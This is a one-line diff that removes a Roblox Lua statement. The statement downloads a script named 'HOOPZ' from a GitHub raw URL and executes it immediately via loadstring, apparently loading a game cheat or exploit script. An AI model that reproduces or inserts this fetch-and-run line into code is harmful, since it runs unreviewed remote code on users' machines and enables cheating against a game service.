@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/girlmagnet123/-utz-BETA-/main/HOOPZ",true))()
